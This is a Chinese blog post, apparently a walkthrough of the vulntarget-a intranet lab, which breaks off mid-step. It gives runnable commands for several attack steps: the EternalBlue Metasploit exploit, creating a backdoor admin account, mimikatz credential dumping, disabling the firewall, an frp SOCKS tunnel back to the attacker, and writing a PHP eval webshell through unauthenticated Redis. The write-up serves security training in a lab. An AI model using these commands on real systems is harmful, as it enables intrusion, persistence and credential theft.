@@ -1,0 +1,957 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E8%95%BE%E5%A7%86.png">
+  <link rel="icon" href="/img/%E8%95%BE%E5%A7%86.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#58C9B9">
+  <meta name="author" content="SCxiaoyun">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulntarget-a靶场复现  1234567891011121314151617181920212223242526272829303132#攻击机OS:Kali 2022外NIC:192.168.x.x   (桥接模式)(与Win7-PC主机进行通信)#Web ServerOS:Windows 7Hostname:Win7-PCServer:通达OA 11.3username:win7pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-a打靶">
+<meta property="og:url" content="https://jsweetcoffee.github.io/posts/d6f0653f.html">
+<meta property="og:site_name" content="晓雲的陋室">
+<meta property="og:description" content="vulntarget-a靶场复现  1234567891011121314151617181920212223242526272829303132#攻击机OS:Kali 2022外NIC:192.168.x.x   (桥接模式)(与Win7-PC主机进行通信)#Web ServerOS:Windows 7Hostname:Win7-PCServer:通达OA 11.3username:win7pa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/1657868834428-f628c01b-5b68-4a07-b27c-e5cc8e16b5e7-1687676865522-1.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622111403820-1687676304662-3.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622111841963.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622112151646.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622113555676-1687676266846-1.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622115253943.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622120842167.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622160409266.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622161715896.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622161813160.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/1658109974190-4da290de-e000-48c7-ba9f-8180c9054618.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/1658110384777-20281a01-ea7a-4153-b3df-3da7269dd5a8.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622174333567.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622175028245.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622180402415.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622181739922.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622181938348.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622182614117.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622182833066.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230622182853422.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623082214290.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623082418143.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623082847322.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623083419479.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623083617809.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623084044535.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623104521780.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623104616711.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623104832510.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623105258959.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623110514687.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623112129672.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/image-20230623113942986.png">
+<meta property="article:published_time" content="2023-08-02T01:38:54.000Z">
+<meta property="article:modified_time" content="2023-08-02T01:38:54.000Z">
+<meta property="article:author" content="SCxiaoyun">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="网安">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/d6f0653f/1657868834428-f628c01b-5b68-4a07-b27c-e5cc8e16b5e7-1687676865522-1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>vulntarget-a打靶 - 晓雲的陋室</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jsweetcoffee.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"♫","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"ture","follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>聊五分钱的天吗？|ω･)و ̑̑༉</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/pic9.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulntarget-a打靶"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        SCxiaoyun
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-02 09:38" pubdate>
+          2023年8月2日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulntarget-a打靶</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>vulntarget-a靶场复现</h1>
+<p><img src="/posts/d6f0653f/1657868834428-f628c01b-5b68-4a07-b27c-e5cc8e16b5e7-1687676865522-1.png" alt="img"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#攻击机</span><br><span class="hljs-symbol">OS:</span>Kali <span class="hljs-number">2022</span><br>外NIC:<span class="hljs-number">192.168</span>.x.x   (桥接模式)(与Win7-PC主机进行通信)<br><br><br><span class="hljs-meta">#Web Server</span><br><span class="hljs-symbol">OS:</span>Windows <span class="hljs-number">7</span><br><span class="hljs-symbol">Hostname:</span>Win7-PC<br><span class="hljs-symbol">Server:</span>通达OA <span class="hljs-number">11.3</span><br><span class="hljs-symbol">username:</span>win7<br><span class="hljs-symbol">password:</span>admin<br>外NIC:<span class="hljs-number">192.168</span>.x.x     (NAT模式)(与Kali通信)<br>内NIC:<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.98</span>   (仅主机模式)(与Win2016主机即可域成员进行通信)(能够<span class="hljs-built_in">Ping</span>通Win2016主机)<br><br><br><span class="hljs-meta">#域成员</span><br><span class="hljs-symbol">OS:</span>Windows Server <span class="hljs-number">2016</span><br><span class="hljs-symbol">Hostname:</span>win2016<br><span class="hljs-symbol">Server:</span>PHPStudy+Redis<br><span class="hljs-symbol">username:</span>vulntarget\win2016<br><span class="hljs-symbol">password:</span>Admin<span class="hljs-meta">#123</span><br>内NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.99</span>     (仅主机模式)(与Win7即WEB主机进行通信)(能够<span class="hljs-built_in">Ping</span>通Win7-PC主机)<br>内NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span>    (仅主机模式)(与Win2019即域控通信)(能够<span class="hljs-built_in">Ping</span>通Win2019主机)<br><br><br><span class="hljs-meta">#域控</span><br><span class="hljs-symbol">OS:</span>Windows Server <span class="hljs-number">2019</span><br><span class="hljs-symbol">Hostname:</span>win2019<br><span class="hljs-symbol">Server:</span>AD DC<br><span class="hljs-symbol">username:</span>vulntarget\administrator	<br><span class="hljs-symbol">password:</span>Admin<span class="hljs-subst">@666</span><br>内网NIC：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span>    (仅主机模式)(与Win2016即域内成员通信)(能够<span class="hljs-built_in">Ping</span>通Win2016主机)<br></code></pre></td></tr></table></figure>
+<h2 id="一、边界主机"><a class="header-anchor" href="#一、边界主机">¶</a>一、边界主机</h2>
+<h3 id="Web端攻击"><a class="header-anchor" href="#Web端攻击">¶</a>Web端攻击</h3>
+<ol>
+<li>拿到边界主机IP，先对其进行访问。按F12发现是通达OA的办公系统。</li>
+</ol>
+<p><img src="/posts/d6f0653f/image-20230622111403820-1687676304662-3.png" alt="image-20230622111403820"></p>
+<ol start="2">
+<li>
+<p>利用通达OA的办公利用工具进行漏洞利用。获取到webshell。</p>
+</li>
+<li>
+<p><img src="/posts/d6f0653f/image-20230622111841963.png" alt="image-20230622111841963"></p>
+</li>
+<li>
+<p>利用蚁剑进行连接。成功上线。</p>
+</li>
+</ol>
+<p><img src="/posts/d6f0653f/image-20230622112151646.png" alt="image-20230622112151646"></p>
+<h3 id="系统层面攻击"><a class="header-anchor" href="#系统层面攻击">¶</a>系统层面攻击</h3>
+<ol>
+<li>
+<p>用nmap扫描发现主机开放135和445端口，系统版本为win7sp1版本，尝试利用永恒之蓝漏洞进行攻击。</p>
+</li>
+<li>
+<p>在kali中开启MSF并调用相应模块。先搜索永恒之蓝的编号：ms17_010(正常情况下要先使用模块3进行探测是否存在永恒之蓝，由于这里是打靶，直接使用模块0，对永恒之蓝进行利用)</p>
+</li>
+</ol>
+<p><img src="/posts/d6f0653f/image-20230622113555676-1687676266846-1.png" alt="image-20230622113555676"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">use 0<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.172.132<br>RHOSTS =&gt; 192.168.172.132<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run<br></code></pre></td></tr></table></figure>
+<ol start="3">
+<li>出现 <code>meterpreter &gt; </code>上线MSF成功。</li>
+</ol>
+<h3 id="拿到远程桌面"><a class="header-anchor" href="#拿到远程桌面">¶</a>拿到远程桌面</h3>
+<ol>
+<li>
+<p>输入<code>netstat -an | findstr 3389</code>发现边界主机并没</p>
+<p>有开启3389端口，在MSF中执行<code>run post/windows/manage/enable_rdp </code>开启3389</p>
+</li>
+<li>
+<p>在蚁剑中创建后门账户。（知识点：创建影子后门账户）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user 用户名 密码 /add<br>net localgroup administrators 用户名 /add<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>使用windows中的<code>mstsc</code>或者kali中的<code>rdesktop</code>进行远程桌面连接。（如果实战中遇到下面这种情况，一定一定一定不要点是！！！）</p>
+</li>
+</ol>
+<p><img src="/posts/d6f0653f/image-20230622115253943.png" alt="image-20230622115253943"></p>
+<h2 id="二、内网域成员主机"><a class="header-anchor" href="#二、内网域成员主机">¶</a>二、内网域成员主机</h2>
+<p>拿下边界主机以后在MSF中输入shell，进入该主机的命令执行端，直接执行命令会出现乱码，执行以下命令修改编码并开始收集信息…</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span>（<span class="hljs-number">65001</span> UTF-<span class="hljs-number">8</span>代码页）<br><span class="hljs-attribute">whoami</span><br><span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span><br><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure>
+<p>输入<code>ipconfig</code>发现当前主机有两个网段的网卡(一个公网网卡一个内网网卡)：</p>
+<p><img src="/posts/d6f0653f/image-20230622120842167.png" alt="image-20230622120842167"></p>
+<p>上传fscan，利用fscan对其内网环境进行扫描（记得关闭防火墙）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcan64</span>.exe -h <span class="hljs-number">10.0.20.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/image-20230622160409266.png" alt="image-20230622160409266"></p>
+<p>但是并没有探测出其他主机…</p>
+<p>在MSF中进行内网探测/信息收集/迁移进程/抓取明文密码/关闭防火墙…</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">shell</span><br>chcp 65001   #设置为UTF-8代码页<br>net user     #查看用户<br>hostname     #查看主机名<br>ipconfig     #查看网卡信息<br>systeminfo   #查看信息信息<br>arp -a       #查看内网通信主机<br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">ps   <span class="hljs-comment">#查看进程信息</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">getpid <span class="hljs-comment">#查看当前木马的进程信息</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">migrate 进程PID <span class="hljs-comment">#将当前进程注入到其他进程中 选择64位的(隐藏木马程序)</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">load kiwi    <span class="hljs-comment"># 加载mimikazt/Shell必须64位才能加载运行KIWI模块</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">kiwi_cmd sekurlsa::logonpasswords   <span class="hljs-comment">#执行mimiakatz的命令/抓取明文密码</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">netsh advfirewall show allprofile state   <span class="hljs-comment">#查看防火墙状态</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">netsh advfirewall <span class="hljs-built_in">set</span>  allprofile state off  <span class="hljs-comment">#关闭防火墙</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f    <span class="hljs-comment">#使用注册表开启3389</span></span><br><br></code></pre></td></tr></table></figure>
+<p>使用<code>arp -a</code>发现内网中还存在一台IP为10.0.20.99 的机器</p>
+<p><img src="/posts/d6f0653f/image-20230622161715896.png" alt="image-20230622161715896"></p>
+<p>此时想在kali中对内网主机中的99机器进行操作，而99机器并不连接外网，只能在98机器上对其进行连接。此时就需要利用MSF来创建路由，通过路由将kali与内网中的99机器连接。</p>
+<p><img src="/posts/d6f0653f/image-20230622161813160.png" alt="image-20230622161813160"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#添加路由</span><br>use post/multi/manage/autoroute<br><span class="hljs-built_in">set</span> session 1    #输入‘sessions’查看当前会话ID<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#扫描存活主机</span><br>use post/windows/gather/arp_scanner<br><span class="hljs-built_in">set</span> session 1<br><span class="hljs-built_in">set</span> rhosts 10.0.20.1-254<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#添加代理</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#扫描目标端口</span><br>use auxiliary/scanner/portscan/tcp<br><span class="hljs-built_in">set</span> ports 22-500,8000-10000<br><span class="hljs-built_in">set</span> rhosts 10.0.20.99<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/1658109974190-4da290de-e000-48c7-ba9f-8180c9054618.png" alt="image.png"></p>
+<p><img src="/posts/d6f0653f/1658110384777-20281a01-ea7a-4153-b3df-3da7269dd5a8.png" alt="image.png"></p>
+<p>此时域成员主机开启了HTTP服务但是只有边界主机可以进行访问，而我们的kali无法进行访问，此时就需要在边界主机和攻击机搭建一个通信隧道来使得攻击机可以通过HTTP协议访问内网域成员主机。</p>
+<p><img src="/posts/d6f0653f/image-20230622174333567.png" alt="image-20230622174333567"></p>
+<p>这里我们使用frp进行隧道的搭建。利用隧道我们可以实现端口的转发和流量的代理。</p>
+<p><img src="/posts/d6f0653f/image-20230622175028245.png" alt="image-20230622175028245"></p>
+<p>我们需要将frpc（客户端）部署到目标机器上，而将frps部署到黑客的VPS(或者kali中)上。</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#frps.ini</span><br>[common]<br>bind_port = 7100<br><br><span class="hljs-comment">#frpc.ini</span><br>[common]<br>server_addr = 192.168.172.129   <span class="hljs-comment">#外网vps地址，即服务端地址，这里为MSF的地址</span><br>server_port = 7100         <span class="hljs-comment">#与服务端建立连接的端口，需与服务端上的frps.ini保持一致</span><br>[plugin_socks]<br>type = tcp   <br>remote_port = 8090      <span class="hljs-comment">#配置攻击主机socks代理时的代理端口</span><br>plugin = socks5                <span class="hljs-comment">#实战中使用socks5代理</span><br>use_encryption = true    <span class="hljs-comment">#是否使用加密</span><br>use_compression = true    <span class="hljs-comment">#是否进行压缩</span><br><span class="hljs-comment">#注意事项</span><br>配置文件中填写时需要把注释符号去掉<br></code></pre></td></tr></table></figure>
+<p>先在kali中执行<code>./frps -c frps.ini</code></p>
+<p>再在目标主机上执行<code>frpc.exe -c frpc.ini </code></p>
+<p><img src="/posts/d6f0653f/image-20230622180402415.png" alt="image-20230622180402415"></p>
+<p>出现如上图所示表面搭建成功了。</p>
+<p>正常情况下搭建好通信隧道应该用SocksCap64等工具进行利用，但是在kali中有一款工具为<em><strong>proxychains4</strong></em>来利用通信隧道。</p>
+<p>首先配置proxychains4的代理服务器的配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑Proxychains配置文件</span><br>vi /etc/proxychain4.conf<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置信息</span><br>socks5 127.0.0.1 8090<br>//socks5 MSF地址 代理端口 账号 密码<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试链接</span><br>proxychains4 curl http://10.0.20.99/<br></code></pre></td></tr></table></figure>
+<p>也可以使用火狐浏览器的代理插件配置如下：</p>
+<p><img src="/posts/d6f0653f/image-20230622181739922.png" alt="image-20230622181739922"></p>
+<p>在火狐浏览器中访问10.0.20.99也可以成功。</p>
+<p><img src="/posts/d6f0653f/image-20230622181938348.png" alt="image-20230622181938348"></p>
+<p>此时我们已经可以访问99机器，这时我们利用工具<em><strong>dirsearch</strong></em></p>
+<p>对网站目录进行扫描……</p>
+<p><img src="/posts/d6f0653f/image-20230622182614117.png" alt="image-20230622182614117"></p>
+<p>可以看到是存在l.php/phpinfo.php/index.php三个目录，对其目录进行访问进一步进行信息收集……</p>
+<p><img src="/posts/d6f0653f/image-20230622182833066.png" alt="image-20230622182833066"></p>
+<p><img src="/posts/d6f0653f/image-20230622182853422.png" alt="image-20230622182853422"></p>
+<p>此时可以确定该主机利用phpstudy搭建的web服务，之前扫描中又爆出该主机开放6379端口，为redis的默认端口，redis存在未授权访问漏洞，此时我们尝试连接登录内网主机的Redis服务发现未设置密码，即可尝试写入一句话木马…Success</p>
+<blockquote>
+<p>主要是因为配置不当，导致未授权访问漏洞。进一步将恶意数据写入内存或者磁盘之中，造成更大的危害，配置不当一般主要是两个原理：</p>
+<ol>
+<li>配置登录策略导致任意机器都可以登录 redis。</li>
+<li>未设置密码或者设置弱口令。</li>
+</ol>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">Redis链接</span><br>proxychains4 redis-cli -h 10.0.20.99<br><span class="hljs-meta prompt_">#</span><span class="language-bash">Redis写木马</span><br>config set dir C:/phpStudy/PHPTutorial/WWW/  #调整服务器配置路径<br>config set dbfilename 4pts.php     #生成文件<br>set 1 &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;    #写入文件<br>save   #保存操作<br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/image-20230623082214290.png" alt="image-20230623082214290"></p>
+<p>访问10.0.20.99/4pts.php,发现其中没有set的一句话木马，说明漏洞利用成功。</p>
+<p><img src="/posts/d6f0653f/image-20230623082418143.png" alt="image-20230623082418143"></p>
+<p>之后我们用本地主机的蚁剑去连接。此时无法直接连接，需要走kali的socks5代理，在蚁剑中的代理设置中进行配置：</p>
